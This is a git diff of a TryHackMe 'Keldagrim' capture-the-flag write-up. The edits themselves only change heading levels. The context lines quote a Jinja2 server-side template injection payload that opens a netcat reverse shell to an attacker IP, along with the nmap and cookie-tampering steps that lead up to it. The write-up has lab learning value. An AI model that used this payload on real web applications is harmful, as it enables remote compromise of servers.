@@ -13,13 +13,13 @@ img_path: /assets/img/tryhackme/keldagrim
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Keldagrim](https://tryhackme.com/room/keldagrim) from [TryHackMe](https://tryhackme.com).
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -51,7 +51,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 There are two open ports, 22 running OpenSSH and 80 running Werkzeug http webserver with python.
 
-## Web
+### Web
 
 Let's navigate to the web server.
 
@@ -110,7 +110,7 @@ We replace the value of `sales` with the new one and refresh the page.
 It did.
 
 
-# **Foothold**
+## **Foothold**
 
 Since this website uses python, i tried to do a server side template injection.
 
@@ -159,6 +159,7 @@ Let's add this the the first rce payload.
 ```python
 \{\{ self.\_TemplateReference\_\_context.cycler.\_\_init\_\_.\_\_globals\_\_.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.11.14.124 9001 >/tmp/f').read() \}\}
 ```
+
 Let's base64 encode the payload, change the cookie value, setup a listener and then refresh the page.
 
 ![](19.png)
@@ -166,7 +167,7 @@ Let's base64 encode the payload, change the cookie value, setup a listener and t
 We got the reverse shell and used python pty to stabilize it.
 
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 Let's check out current privileges.
 
@@ -211,7 +212,3 @@ Congratulations, we got root.
 ---
 
 Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
-
----
-
-# References
